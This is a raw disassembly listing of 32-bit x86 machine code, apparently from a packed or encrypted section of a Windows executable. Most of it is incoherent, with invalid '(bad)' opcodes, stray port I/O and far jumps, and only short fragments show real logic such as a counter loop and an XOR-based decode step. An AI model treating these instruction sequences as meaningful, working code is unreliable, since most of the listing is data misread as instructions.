  401904:	mov    DWORD PTR [edx+edi*2-0x6b1df66f],esp
  40190b:	inc    ebp
  40190c:	push   ds
  40190d:	xlat   BYTE PTR ds:[ebx]
  40190e:	dec    ecx
  40190f:	arpl   WORD PTR [ebp-0x66e9de9],cx
  401915:	test   BYTE PTR [eax],al
  401917:	mov    DWORD PTR [edi+0x3c],ebp
  40191a:	mov    ebx,0x25b0538e
  40191f:	(bad)
  401922:	xchg   edi,eax
  401923:	dec    eax
  401924:	jae    0x4018a8
  401926:	xor    ebp,DWORD PTR [esi+0x23bdb55]
  40192c:	aas    
  40192d:	aaa    
  40192e:	cld    
  40192f:	jp     0x401912
  401931:	fadd   DWORD PTR [esi+edi*8]
  401934:	xchg   esp,eax
  401935:	sub    DWORD PTR [edx+0x691d6948],ebp
  40193b:	into   
  40193c:	inc    edx
  40193d:	not    cl
  40193f:	fmul   DWORD PTR [edx+0x69345d83]
  401945:	xor    dh,BYTE PTR [eax+0x5a3ebca]
  40194b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40194c:	addps  xmm1,XMMWORD PTR [eax]
  40194f:	mov    eax,ds:0xedb700a3
  401954:	jb     0x4292c4df
  40195a:	in     al,dx
  40195b:	sbb    al,0xe4
  40195d:	out    dx,al
  40195e:	cmp    eax,0x250466a0
  401963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401964:	inc    esi
  401965:	cld    
  401966:	xor    DWORD PTR [edi-0x3050c3d4],ebp
  40196c:	mov    bh,cl
  40196e:	rcr    DWORD PTR [eax],cl
  401970:	mov    al,ds:0xb7bd71ac
  401975:	sbb    ebp,DWORD PTR [ebx+0x64]
  401978:	test   eax,0xc16ffa40
  40197d:	push   cs
  40197e:	jg     0x401930
  401980:	lock jmp 0x4fa8b92d
  401986:	outs   dx,DWORD PTR ds:[esi]
  401987:	jb     0x401997
  401989:	dec    ebx
  40198a:	pusha  
  40198b:	(bad)  
  40198d:	imul   ebp,ecx,0x1c
  401990:	dec    esp
  401991:	fstp   DWORD PTR [ebx]
  401993:	pusha  
  401994:	pop    edx
  401995:	repz imul ebx,ebx,0x2c
  401999:	xor    BYTE PTR [edx],bl
  40199b:	test   eax,0xc8159c79
  4019a0:	push   esi
  4019a1:	mov    al,0xfb
  4019a3:	mov    WORD PTR [ecx+ebp*4-0x55a73a4c],ss
  4019aa:	or     dl,bh
  4019ac:	add    cl,BYTE PTR [ebp+0x403fd3b3]
  4019b2:	pop    edi
  4019b3:	stc    
  4019b4:	fisub  DWORD PTR [ebx]
  4019b6:	fdivr  QWORD PTR [edx]
  4019b8:	rcl    DWORD PTR [edi+0xb1aef5d],cl
  4019be:	int3   
  4019bf:	mov    eax,0xb31ac131
  4019c4:	mov    ds:0x132e6741,eax
  4019c9:	loopne 0x401973
  4019cb:	scas   al,BYTE PTR es:[edi]
  4019cc:	push   0x41
  4019ce:	mov    esi,0x4c4b15ed
  4019d3:	test   bh,ch
  4019d5:	clc    
  4019d6:	test   BYTE PTR [esi-0x37b6f896],cl
  4019dc:	sub    DWORD PTR [edi],eax
  4019de:	pusha  
  4019df:	mov    ch,0x48
  4019e1:	or     ebx,DWORD PTR [eax+0x17c35966]
  4019e7:	pop    ebp
  4019e8:	inc    ebp
  4019e9:	xchg   BYTE PTR ds:0x3554fff1,bh
  4019ef:	mov    eax,0xbd5dfb7b
  4019f4:	pop    esi
  4019f5:	mov    ah,ch
  4019f7:	lods   al,BYTE PTR ds:[esi]
  4019f8:	cli    
  4019f9:	fwait
  4019fa:	pop    ds
  4019fb:	mov    edx,0xbf0038f6
  401a00:	cmp    cl,al
  401a02:	pop    ecx
  401a03:	mov    ah,0x80
  401a05:	and    eax,0xd1ff309f
  401a0a:	push   ecx
  401a0b:	mov    cl,BYTE PTR [edi-0x19]
  401a0e:	sub    BYTE PTR [ebp-0x6],dl
  401a11:	mov    dl,BYTE PTR [eax]
  401a13:	jb     0x401a69
  401a15:	ins    BYTE PTR es:[edi],dx
  401a16:	loopne 0x401a77
  401a18:	pop    ebx
  401a19:	cmp    ecx,DWORD PTR [ecx+0x2d68a456]
  401a1f:	ret    
  401a20:	inc    esp
  401a21:	ror    ebx,cl
  401a23:	sar    BYTE PTR [edx],0xf5
  401a26:	xchg   BYTE PTR [esi+ebp*1-0x4c],bl
  401a2a:	and    eax,0x137fab73
  401a2f:	out    0xc2,al
  401a31:	ins    DWORD PTR es:[edi],dx
  401a32:	inc    ebx
  401a33:	(bad)  
  401a34:	jge    0x401a36
  401a36:	mov    edi,fs
  401a38:	(bad)  
  401a39:	cld    
  401a3a:	lock stos BYTE PTR es:[edi],al
  401a3c:	mov    dl,0xfd
  401a3e:	jno    0x401aab
  401a40:	cmp    eax,0x240f6a47
  401a45:	fdiv   QWORD PTR [ebx-0xbd7d5f3]
  401a4b:	out    0x49,eax
  401a4d:	jmp    0x4019fb
  401a4f:	fstp   QWORD PTR [edi-0x44eb2f83]
  401a55:	mov    eax,ds:0x30554710
  401a5a:	into   
  401a5b:	cwde   
  401a5c:	fcmovne st,st(2)
  401a5e:	xor    ch,BYTE PTR [edx+0x458b76ff]
  401a64:	or     BYTE PTR [ecx+0x4345cf25],al
  401a6a:	add    BYTE PTR [eax],al
  401a6c:	add    BYTE PTR [eax],al
  401a6e:	add    BYTE PTR [ebx+0x4345cf0d],cl
  401a74:	add    BYTE PTR [ecx-0x77],al
  401a77:	or     eax,0x4345cf
  401a7c:	cmp    DWORD PTR ds:0x4345cf,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x4345cf,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x4345cf
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x4345cf,ecx
  401aae:	cmp    DWORD PTR ds:0x4345cf,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0x83b5485e
  401ae8:	dec    edx
  401ae9:	cmc    
  401aea:	push   edx
  401aeb:	add    al,0x7e
  401aed:	jle    0x401aa4
  401aef:	jg     0x401b6f
  401af1:	jle    0x401b33
  401af3:	out    0xb6,al
  401af5:	mov    edi,esi
  401af7:	xchg   edx,eax
  401af8:	push   ebp
  401af9:	push   esp
  401afa:	jae    0x401aef
  401afc:	jge    0x401b26
  401afe:	sub    al,0xb4
  401b00:	scas   al,BYTE PTR es:[edi]
  401b01:	mov    bl,0x98
  401b03:	fadd   QWORD PTR [ebp+0x76167f54]
  401b09:	mov    edx,0xcbbfd38f
  401b0e:	and    eax,0xaffc2f81
  401b13:	jne    0x401b24
  401b15:	mov    BYTE PTR [edx-0x60],bl
  401b18:	fisub  DWORD PTR [esi+esi*8+0x19be509e]
  401b1f:	cwde   
  401b20:	fisttp DWORD PTR [edx]
  401b22:	xchg   ebx,eax
  401b23:	sbb    al,0xfb
  401b25:	clc    
  401b26:	mov    DWORD PTR [ebx],ecx
  401b28:	fwait
  401b29:	enter  0x8d12,0xef
  401b2d:	int3   
  401b2e:	je     0x401ba7
  401b30:	cdq    
  401b31:	xor    al,0x28
  401b33:	jbe    0x401b6a
  401b35:	mov    ecx,0x33075566
  401b3a:	fcomp  QWORD PTR [eax]
  401b3c:	icebp  
  401b3d:	inc    edx
  401b3e:	add    BYTE PTR [edi-0x1130bfda],0x42
  401b45:	aaa    
  401b46:	int    0x1f
  401b48:	cwde   
  401b49:	fs mov ch,0x8a
  401b4c:	popa   
  401b4d:	arpl   WORD PTR [ecx],bx
  401b4f:	aas    
  401b50:	loope  0x401bbe
  401b52:	das    
  401b53:	aas    
  401b54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b55:	fs mov ecx,0x3851c5df
  401b5b:	adc    dl,BYTE PTR [ecx+0x75]
  401b5e:	adc    ebp,DWORD PTR [ecx]
  401b60:	sbb    esp,DWORD PTR [esp+ebp*2]
  401b63:	sar    DWORD PTR [edx],cl
  401b65:	fisub  DWORD PTR [edx+0x27369de6]
  401b6b:	out    dx,eax
  401b6c:	(bad)  
  401b6e:	xchg   esp,eax
  401b6f:	and    DWORD PTR [edi],edi
  401b71:	mov    ah,0xe9
  401b73:	pop    edx
  401b74:	stos   DWORD PTR es:[edi],eax
  401b75:	jg     0x401bb3
  401b77:	(bad)  
  401b78:	clc    
  401b79:	mov    edx,0xa8181c4f
  401b7e:	xlat   BYTE PTR ds:[ebx]
  401b7f:	xor    BYTE PTR [ebx+0x68],dl
  401b82:	xor    ch,bh
  401b84:	imul   edx,esp,0xb0ffd664
  401b8a:	push   cs
  401b8b:	arpl   WORD PTR [ecx],ax
  401b8d:	jbe    0x401bae
  401b8f:	sbb    eax,0x751d2e3c
  401b94:	lahf   
  401b95:	and    ax,0x1760
  401b99:	xchg   esi,eax
  401b9a:	xchg   DWORD PTR [eax+0x32],edi
  401b9d:	cmp    al,0xda
  401b9f:	jno    0x401bc3
  401ba1:	(bad)  
  401ba3:	call   0x1ef64ec9
  401ba8:	and    ax,0xeea6
  401bac:	call   0x496c513b
  401bb1:	adc    esi,DWORD PTR [eax-0x68]
  401bb4:	fs (bad) 
  401bb6:	repz call 0x68230953
  401bbc:	adc    DWORD PTR [ecx-0x15],edi
  401bbf:	mov    esi,0x4e646b29
  401bc4:	mov    dl,0x5
  401bc6:	enter  0x2d08,0x25
  401bca:	nop
  401bcb:	mov    ds:0xcb07fad9,al
  401bd0:	jmp    0x78d3:0xc737d726
  401bd7:	into   
  401bd8:	xor    DWORD PTR [eax-0x1e],esp
  401bdb:	mov    eax,0xd4e4ed9e
  401be0:	dec    esp
  401be1:	mov    cl,0xd3
  401be3:	iret   
  401be4:	shl    DWORD PTR [edx],1
  401be6:	and    BYTE PTR [esp+eiz*8],al
  401be9:	mov    eax,0xa7367611
  401bee:	iret   
  401bef:	sbb    BYTE PTR [ebx],ch
  401bf1:	hlt    
  401bf2:	ret    
  401bf3:	outs   dx,BYTE PTR ds:[esi]
  401bf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bf5:	xacquire xchg BYTE PTR [edi-0x5c6d7a7e],dh
  401bfc:	mov    bh,bh
  401bfe:	mov    ebx,ecx
  401c00:	nop
  401c01:	mov    edi,0xb76f0db5
  401c06:	stos   BYTE PTR es:[edi],al
  401c07:	or     eax,0x63dee6a2
  401c0c:	sbb    DWORD PTR [eax],0x5d27e576
  401c12:	xchg   edi,eax
  401c13:	vcvtsd2ss xmm2,xmm0,xmm2
  401c17:	inc    edx
  401c18:	jne    0x401c0c
  401c1a:	pop    esi
  401c1b:	nop
  401c1c:	mov    ah,BYTE PTR ds:0x312fbdfd
  401c22:	pop    esi
  401c23:	push   edx
  401c24:	sbb    BYTE PTR [ebx],ah
  401c26:	dec    edi
  401c27:	ss fmul st(4),st
  401c2a:	adc    edx,eax
  401c2c:	push   esp
  401c2d:	into   
  401c2e:	aam    0x76
  401c30:	mov    ah,0x90
  401c32:	jg     0x401c6d
  401c34:	mov    eax,ds:0xb24880e3
  401c39:	out    0xef,al
  401c3b:	cmp    ecx,DWORD PTR [ebx-0x330fa802]
  401c41:	pop    esi
  401c42:	test   eax,0xe974bb31
  401c47:	dec    ebx
  401c48:	bound  ebp,QWORD PTR [edx]
  401c4a:	sub    al,0x7c
  401c4c:	jecxz  0x401c42
  401c4e:	(bad)  
  401c4f:	in     al,dx
  401c50:	nop
  401c51:	inc    edx
  401c52:	imul   ecx,edx,0x63
  401c55:	mov    dh,0x9f
  401c57:	mov    ebp,0xe3bfc4b3
  401c5c:	lahf   
  401c5d:	ins    BYTE PTR es:[edi],dx
  401c5e:	adc    esi,DWORD PTR [ebp+eax*4-0x2e]
  401c62:	shl    ebp,cl
  401c64:	das    
  401c65:	sub    al,0xc4
  401c67:	adc    al,0x46
  401c69:	stc    
  401c6a:	xchg   ecx,eax
  401c6b:	sbb    esp,ebx
  401c6d:	imul   eax,DWORD PTR [ebx-0x3c],0xf9aac36b
  401c74:	cmp    BYTE PTR [ebx-0x56],0x8c
  401c78:	addr16 ds mov ecx,0xa1eabfe0
  401c7f:	das    
  401c80:	aad    0x9e
  401c82:	call   DWORD PTR [edx+0x5a]
  401c85:	scas   eax,DWORD PTR es:[edi]
  401c86:	outs   dx,DWORD PTR fs:[esi]
  401c88:	cmp    DWORD PTR [eax+0x646a19b9],ebx
  401c8e:	dec    esp
  401c8f:	jp     0x401cf6
  401c91:	imul   edi,ebx,0x7a
  401c94:	xchg   ebp,eax
  401c95:	les    edi,FWORD PTR [edx-0x1980f973]
  401c9b:	jmp    0x401c70
  401c9d:	lods   eax,DWORD PTR ds:[esi]
  401c9e:	and    esp,DWORD PTR [ebp+0x3f7cd8d5]
  401ca4:	sub    BYTE PTR [esi-0x5e628cb8],ah
  401caa:	ror    BYTE PTR [ebx+0x41],cl
  401cad:	add    BYTE PTR [ebx+0x4d8b6600],cl
  401cb3:	cld    
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	and    esi,DWORD PTR [esi+eax*4+0x7e0689f0]
  401cd1:	jle    0x401c88
  401cd3:	jg     0x401d53
  401cd5:	jle    0x401d47
  401cd7:	pop    edx
  401cd8:	adc    edi,DWORD PTR [ecx-0x1124f454]
  401cde:	mov    al,ds:0x860285c2
  401ce3:	add    eax,0x1673659f
  401ce8:	push   0x73a2b407
  401ced:	dec    eax
  401cee:	out    dx,al
  401cef:	xchg   edx,eax
  401cf0:	mov    ch,0x9f
  401cf2:	jbe    0x401d35
  401cf4:	sbb    DWORD PTR [ecx-0x2d],esp
  401cf7:	mov    al,BYTE PTR [esi]
  401cf9:	loop   0x401cc6
  401cfb:	jecxz  0x401cf8
  401cfd:	(bad)  
  401cfe:	in     al,dx
  401cff:	mov    dl,0xde
  401d01:	sti    
  401d02:	adc    dx,si
  401d05:	iret   
  401d06:	arpl   WORD PTR [edx],sp
  401d08:	in     eax,0x14
  401d0a:	scas   eax,DWORD PTR es:[edi]
  401d0b:	fbld   TBYTE PTR [ecx]
  401d0d:	std    
  401d0e:	ss dec eax
  401d10:	sub    eax,0xd0f962e4
  401d15:	sub    al,0x2a
  401d17:	adc    DWORD PTR [ecx],esi
  401d19:	or     BYTE PTR [ebx],al
  401d1b:	fiadd  DWORD PTR ds:0x2090e556
  401d21:	mov    BYTE PTR [ecx+esi*2],dl
  401d24:	sbb    BYTE PTR [edi-0x2f1938d3],bl
  401d2a:	cmc    
  401d2b:	and    cl,BYTE PTR [ecx]
  401d2d:	inc    edx
  401d2e:	cli    
  401d2f:	adc    dh,BYTE PTR [ecx-0x2b8130c3]
  401d35:	jecxz  0x401cfc
  401d37:	in     eax,dx
  401d38:	jl     0x401cfd
  401d3a:	cmp    BYTE PTR [eax-0x6674557f],0xd8
  401d41:	jge    0x401d5f
  401d43:	les    eax,FWORD PTR [esi-0x39]
  401d46:	sahf   
  401d47:	mov    ebx,0x1bb3ed73
  401d4c:	adc    eax,0xdd5ac978
  401d51:	js     0x401d32
  401d53:	mov    cl,BYTE PTR [edx+0x248c5d3e]
  401d59:	jmp    0xab67:0x37d6f80c
  401d60:	push   ecx
  401d61:	sub    eax,0x98b37f2e
  401d66:	fisub  WORD PTR [esi]
  401d68:	neg    BYTE PTR [edi+ebp*8-0x52]
  401d6c:	fcmovu st,st(6)
  401d6e:	or     BYTE PTR [edi-0x1a],ch
  401d71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d72:	mov    esp,0xfa862e11
  401d77:	retf   0x5db9
  401d7a:	jle    0x401d17
  401d7c:	push   0x7e
  401d7e:	inc    edx
  401d7f:	retf   0x69b
  401d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d83:	mov    al,0x1
  401d85:	xor    eax,0x3cec66ac
  401d8a:	push   cs
  401d8b:	fdivr  DWORD PTR [eax]
  401d8d:	lea    esi,[ecx-0x3a3c1738]
  401d93:	mov    al,ds:0x92289892
  401d98:	mov    al,ds:0xbf99ea31
  401d9d:	sbb    bl,ah
  401d9f:	fcmovb st,st(4)
  401da1:	into   
  401da2:	ja     0x401dae
  401da4:	repnz inc ebx
  401da6:	push   edi
  401da7:	inc    ecx
  401da8:	es scas al,BYTE PTR es:[edi]
  401daa:	(bad)  
  401dab:	cwde   
  401dac:	lock push ds
  401dae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401daf:	and    BYTE PTR [edx-0x8be6c1f],dl
  401db5:	ror    ebp,0x85
  401db8:	arpl   WORD PTR [eax-0x14e051bf],bx
  401dbe:	cmp    edx,edx
  401dc0:	(bad)  
  401dc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dc2:	test   al,0xd4
  401dc4:	out    0xf3,eax
  401dc6:	out    0xb,al
  401dc8:	xor    eax,0xd12cef4
  401dcd:	stos   DWORD PTR es:[edi],eax
  401dce:	scas   eax,DWORD PTR es:[edi]
  401dcf:	xor    eax,0x684e7dac
  401dd4:	add    al,0x4
  401dd6:	push   0xd5eaf59f
  401ddb:	call   0xa1e2f057
  401de0:	imul   BYTE PTR [esi]
  401de2:	add    ah,BYTE PTR [ecx-0x24]
  401de5:	jns    0x401dbb
  401de7:	das    
  401de8:	add    BYTE PTR [ebp+esi*8-0x6c],ah
  401dec:	mov    eax,0x6f82a9d2
  401df1:	dec    edi
  401df2:	addr16 popa 
  401df4:	rcr    DWORD PTR [eax-0x1b3498c9],0x62
  401dfb:	test   ebx,ebx
  401dfd:	(bad)  
  401dff:	push   ds
  401e00:	xchg   edx,eax
  401e01:	sbb    BYTE PTR [edx-0x63bc32de],al
  401e07:	cmp    BYTE PTR [edi-0x4401fb27],dl
  401e0d:	fdivrp st(6),st
  401e0f:	and    al,0xa5
  401e11:	mov    ds:0xd2fb7f7,al
  401e16:	xchg   ebp,eax
  401e17:	in     eax,dx
  401e18:	in     eax,dx
  401e19:	xor    DWORD PTR [ebx],ebx
  401e1b:	(bad)  
  401e1c:	ins    DWORD PTR es:[edi],dx
  401e1d:	or     dh,BYTE PTR [ebx]
  401e1f:	daa    
  401e20:	pop    edx
  401e21:	dec    ebp
  401e22:	into   
  401e23:	mov    ah,0xb0
  401e25:	repz std 
  401e27:	cdq    
  401e28:	mov    edx,0xaec50998
  401e2d:	stos   DWORD PTR es:[edi],eax
  401e2e:	inc    ecx
  401e2f:	mov    ecx,0xab37f3cd
  401e34:	into   
  401e35:	mov    dl,0x66
  401e37:	pop    ebx
  401e38:	jl     0x401e8c
  401e3a:	push   DWORD PTR [ecx-0x867a158]
  401e40:	call   0x6e290456
  401e45:	gs push ds
  401e47:	jmp    0x401e7a
  401e49:	cmp    dh,bh
  401e4b:	dec    edx
  401e4c:	sbb    bl,BYTE PTR [edx-0x6c]
  401e4f:	dec    ebx
  401e50:	mov    ds:0x9b6dbca4,al
  401e55:	les    ecx,FWORD PTR [eax-0x41]
  401e58:	int3   
  401e59:	xchg   ecx,eax
  401e5a:	and    eax,0xfc2a1571
  401e5f:	iret   
  401e60:	or     BYTE PTR [ecx-0x53],dl
  401e63:	shr    ah,1
  401e65:	fcmovu st,st(2)
  401e67:	retf   0xa308
  401e6a:	push   ss
  401e6b:	loop   0x401e8a
  401e6d:	jmp    0x520250f2
  401e72:	hlt    
  401e73:	daa    
  401e74:	dec    eax
  401e75:	push   ss
  401e76:	cmp    al,0x4a
  401e78:	das    
  401e79:	cmp    eax,0x63566caf
  401e7e:	sub    eax,0xd84478a4
  401e83:	pusha  
  401e84:	(bad)  
  401e85:	push   ds
  401e86:	mov    esi,0x90f2c3d5
  401e8b:	dec    edx
  401e8c:	loop   0x401e17
  401e8e:	dec    ebp
  401e8f:	call   0x8b4c641f
  401e94:	dec    ebp
  401e95:	or     al,0x33
  401e97:	mov    BYTE PTR [ebx],0xc0
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	ins    BYTE PTR es:[edi],dx
  401eb0:	fnstenv [eax]
  401eb2:	jb     0x401e74
  401eb4:	add    BYTE PTR [esi+0x7e],bh
  401eb7:	mov    ch,0x7f
  401eb9:	jle    0x401f39
  401ebb:	jae    0x401e65
  401ebd:	or     DWORD PTR [esi],esi
  401ebf:	imul   esp,DWORD PTR [edi-0x66eafe89],0x5942ecd4
  401ec9:	pop    ss
  401eca:	fldenv [ebp+0x7ef052af]
  401ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ed1:	fsubr  QWORD PTR [ebp-0x5fbf07]
  401ed7:	inc    esp
  401ed8:	jne    0x401f29
  401eda:	daa    
  401edb:	or     ebp,DWORD PTR [eax]
  401edd:	in     eax,0xac
  401edf:	mov    bh,0xde
  401ee1:	dec    edi
  401ee2:	enter  0xe315,0x85
  401ee6:	scas   al,BYTE PTR es:[edi]
  401ee7:	sub    eax,0x5e462010
  401eec:	fst    QWORD PTR [eax]
  401eee:	jecxz  0x401ee6
  401ef0:	lods   al,BYTE PTR ds:[esi]
  401ef1:	jo     0x401f17
  401ef3:	repnz mov ebp,0xdea66b97
  401ef9:	jle    0x401f67
  401efb:	add    DWORD PTR [edi-0x4a284ece],eax
  401f01:	inc    esp
  401f02:	xchg   esp,eax
  401f03:	dec    esi
  401f04:	jnp    0x401ef8
  401f06:	push   0x8ac50941
  401f0b:	hlt    
  401f0c:	clc    
  401f0d:	pop    edx
  401f0e:	or     eax,0x172224e0
  401f13:	(bad)  
  401f14:	fisub  WORD PTR [esi-0x76a2cd19]
  401f1a:	ja     0x401f75
  401f1c:	in     al,dx
  401f1d:	leave  
  401f1e:	lahf   
  401f1f:	ins    BYTE PTR es:[edi],dx
  401f20:	ins    DWORD PTR es:[edi],dx
  401f21:	and    al,0xba
  401f23:	repz sub eax,DWORD PTR ds:0xfbd06b70
  401f2a:	mov    ebp,0x84743e06
  401f2f:	test   eax,0x54170c32
  401f34:	push   ebp
  401f35:	jmp    0x401f99
  401f37:	mov    ebp,0x9d79faca
  401f3c:	xor    BYTE PTR [ebx],ah
  401f3e:	mov    esp,0xaf671451
  401f43:	jp     0x401f04
  401f45:	rcr    BYTE PTR [ebx],cl
  401f47:	sbb    al,dh
  401f49:	pop    ebp
  401f4a:	sub    al,bh
  401f4c:	adc    al,0x51
  401f4e:	mov    dl,0x2c
  401f50:	stos   BYTE PTR es:[edi],al
  401f51:	and    ecx,DWORD PTR [ecx]
  401f53:	xchg   edx,eax
  401f54:	sub    cl,BYTE PTR [ebx-0x427fe0f7]
  401f5a:	int3   
  401f5b:	or     DWORD PTR [eax],ebp
  401f5d:	adc    ah,0x46
  401f60:	sbb    DWORD PTR [esp+ebp*8+0x2e],0x7e
  401f65:	dec    edi
  401f66:	inc    ecx
  401f67:	jo     0x401fe4
  401f69:	and    dh,BYTE PTR [edi+0x57]
  401f6c:	mov    WORD PTR [edi-0x17c88ce3],ss
  401f72:	retf   0x5e7b
  401f75:	mov    bh,0xf8
  401f77:	xor    ebx,eax
  401f79:	xor    al,0x76
  401f7b:	add    esi,0xffffff99
  401f7e:	ja     0x401f4b
  401f80:	nop
  401f81:	ficomp WORD PTR [ecx+ebp*4+0x7e14db85]
  401f88:	pusha  
  401f89:	retf   0x525e
  401f8c:	test   eax,0xbb173f2c
  401f91:	and    edi,DWORD PTR ds:0xe8a7ce9b
  401f97:	add    eax,DWORD PTR [ebp-0x4c9ba192]
  401f9d:	enter  0xf8ef,0xda
  401fa1:	retf   
  401fa2:	cmovg  esi,DWORD PTR [esi+eiz*8-0x3d2f8616]
  401faa:	or     ecx,edx
  401fac:	imul   ecx,DWORD PTR [ecx+0x67],0x1617bebb
  401fb3:	xchg   esi,eax
  401fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fb5:	or     eax,0x93bf3033
  401fba:	out    dx,al
  401fbb:	addr16 inc ecx
  401fbd:	pop    esi
  401fbe:	or     bl,dh
  401fc0:	xchg   edx,eax
  401fc1:	stos   BYTE PTR es:[edi],al
  401fc2:	rcl    DWORD PTR [ecx-0x4f],0x2f
  401fc6:	mov    ds:0x56c4daa8,eax
  401fcb:	fs jecxz 0x401f5e
  401fce:	dec    esi
  401fcf:	lahf   
  401fd0:	mov    di,0x10b0
  401fd4:	sbb    eax,0xbed6d9b9
  401fd9:	(bad)  
  401fda:	dec    edx
  401fdb:	retf   0xbc77
  401fde:	jg     0x402040
  401fe0:	pop    esi
  401fe1:	iret   
  401fe2:	loope  0x40203e
  401fe4:	add    al,0xed
  401fe6:	or     al,0x84
  401fe8:	jge    0x401f82
  401fea:	arpl   bp,di
  401fec:	dec    esp
  401fed:	int3   
  401fee:	ret    0xf98f
  401ff1:	xor    BYTE PTR [eax],0xac
  401ff4:	inc    ebp
  401ff5:	xchg   edi,eax
  401ff6:	cld    
  401ff7:	dec    ebx
  401ff8:	outs   dx,DWORD PTR ds:[esi]
  401ff9:	clc    
  401ffa:	cmp    edx,eax
  401ffc:	mov    eax,ds:0x33cb7b0a
  402001:	xor    ch,BYTE PTR [edx+0x3b3e16d]
  402007:	clc    
  402008:	add    DWORD PTR [ebp+0x4c],ecx
  40200b:	push   ebx
  40200c:	and    DWORD PTR [edi],ebp
  40200e:	fldcw  WORD PTR [eax]
  402010:	test   BYTE PTR [ebx+0x16],dl
  402013:	lahf   
  402014:	and    BYTE PTR [edx-0x34],ah
  402017:	sub    ebx,esp
  402019:	pop    eax
  40201a:	jbe    0x402037
  40201c:	mov    ebx,0x22368c7d
  402021:	hlt    
  402022:	(bad)  
  402023:	jmp    0x20e4a4a9
  402028:	out    0xae,al
  40202a:	mov    edi,DWORD PTR [edx]
  40202c:	inc    eax
  40202d:	mov    BYTE PTR [eax+0x2],dl
  402030:	rol    dl,1
  402032:	inc    BYTE PTR ds:0x812a6b60
  402038:	and    al,0xf5
  40203a:	aas    
  40203b:	ret    0xb5e5
  40203e:	rol    BYTE PTR [edx],1
  402040:	fsub   DWORD PTR [ebx+0x34]
  402043:	inc    eax
  402044:	loopne 0x401fcf
  402046:	mov    al,ds:0x65319735
  40204b:	rcl    DWORD PTR [ebx+0x5c],1
  40204e:	push   ebx
  40204f:	and    al,0x2b
  402051:	sbb    al,0x74
  402053:	nop
  402054:	push   ecx
  402055:	jbe    0x401fe5
  402057:	aas    
  402058:	push   edi
  402059:	pop    esp
  40205a:	pop    edi
  40205b:	mov    ecx,DWORD PTR [ebp-0x21]
  40205e:	ret    
  40205f:	inc    edx
  402060:	int3   
  402061:	push   ss
  402062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402063:	adc    bh,BYTE PTR [edx+eax*2+0x48]
  402067:	jecxz  0x4020bf
  402069:	out    0x45,eax
  40206b:	loope  0x4020d7
  40206d:	call   0x8b66:0xaad7de29
  402074:	inc    ebp
  402075:	cld    
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [edi+0x7f4471ae],ebx
  4020a6:	add    bh,BYTE PTR [esi+0x7e]
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	fstp   QWORD PTR [eax-0x1ce71008]
  4020b3:	aas    
  4020b4:	cmp    eax,eax
  4020b6:	outs   dx,DWORD PTR ds:[esi]
  4020b7:	jns    0x4020fc
  4020b9:	rcr    DWORD PTR [edi+0x5],1
  4020bc:	mov    ebx,0xab91005
  4020c1:	mov    al,0x90
  4020c3:	cmp    bl,ch
  4020c5:	lods   eax,DWORD PTR ds:[esi]
  4020c6:	retf   0x1720
  4020c9:	or     DWORD PTR [edx-0x5d46c0fb],0xeb78347a
  4020d3:	daa    
  4020d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020d5:	jo     0x402134
  4020d7:	inc    esp
  4020d8:	int3   
  4020d9:	jmp    0x236f81d8
  4020de:	fs (bad) 
  4020e0:	popf   
  4020e1:	adc    BYTE PTR [ecx+0x11539b36],dh
  4020e7:	jge    0x40209f
  4020e9:	and    al,0xdb
  4020eb:	and    ebp,eax
  4020ed:	jae    0x402101
  4020ef:	or     eax,0x414834b3
  4020f4:	add    al,bl
  4020f6:	icebp  
